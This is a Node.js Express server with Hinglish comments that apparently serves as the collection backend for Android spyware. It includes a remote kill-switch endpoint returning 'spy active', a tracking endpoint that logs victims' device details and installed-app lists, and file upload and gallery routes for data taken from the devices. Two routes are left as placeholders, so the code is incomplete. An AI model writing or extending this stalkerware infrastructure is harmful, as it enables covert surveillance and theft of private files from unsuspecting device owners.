const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

/* ================= CONFIG ================ */
const LOG_FILE = "logs.json";
const UPLOAD_DIR = path.join(__dirname, "uploads");
const CONFIG_FILE = "config.json";   // ← New: config file for easy control

if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

// Default config (agar file na ho toh yeh use hoga)
let spyConfig = { enabled: true };   // ← yahan se control kar sakta hai

// Config load karo (agar file hai toh)
if (fs.existsSync(CONFIG_FILE)) {
  try {
    spyConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8'));
  } catch (e) {}
}

/* ================= HELPERS ================= */
function getIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0]
      || req.socket.remoteAddress
      || "unknown";
}

function saveLog(data) {
  try {
    fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
  } catch {}
}

function parseBody(body) {
  const obj = {};
  body.split("&").forEach(pair => {
    const [key, value] = pair.split("=");
    if (key && value) {
      obj[key] = decodeURIComponent(value);
    }
  });
  if (obj.apps) {
    obj.apps = obj.apps.split(",").map(x => x.trim()).filter(Boolean);
  }
  return obj;
}

/* ================= NEW: CONFIG CHECK ENDPOINT ================= */
app.get('/check', (req, res) => {
  // Optional: device id ya ip se specific control kar sakte ho future mein
  const ip = getIP(req);

  console.log(`📡 Check request from IP: ${ip} | Enabled: ${spyConfig.enabled}`);

  res.json({
    enabled: spyConfig.enabled,     // true/false
    message: spyConfig.enabled ? "spy active" : "spy disabled",
    timestamp: new Date().toISOString()
  });
});

/* ================= TRACK ================= */
app.post('/track', (req, res) => {
  let body = "";
  req.on('data', chunk => body += chunk.toString());
  req.on('end', () => {
    const parsed = parseBody(body);
    const data = {
      ip: getIP(req),
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      apps: parsed.apps || [],
      time: new Date().toISOString()
    };
    console.log("\n📱 DEVICE =====================");
    console.log("IP:", data.ip);
    console.log("Battery:", data.battery);
    console.log("Apps count:", data.apps.length);
    saveLog(data);
    res.json({ status: "ok" });
  });
});

/* ================= UPLOAD ================= */
app.post('/upload', (req, res) => {
  let fileName = Date.now().toString();
  if (req.query.name) {
    const original = path.basename(req.query.name);
    const ext = path.extname(original);
    fileName += ext || ".bin";
  } else {
    fileName += ".bin";
  }
  const filePath = path.join(UPLOAD_DIR, fileName);
  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);
  req.on('end', () => {
    console.log("\n📦 FILE RECEIVED =====================");
    console.log("Saved as:", fileName);
    saveLog({
      type: "file",
      file: fileName,
      time: new Date().toISOString()
    });
    res.json({ status: "uploaded", file: fileName });
  });
  req.on('error', () => {
    res.status(500).send("error");
  });
});

/* ================= USERS & GALLERY (same as before) ================= */
app.get('/users', (req, res) => { ... same code as you had ... });

app.get('/gallery', (req, res) => { ... same code as you had ... });

app.use('/uploads', express.static(UPLOAD_DIR));

/* ================= START ================= */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`   Check endpoint: http://yourdomain:${PORT}/check`);
  console.log(`   Spy enabled: ${spyConfig.enabled}`);
});
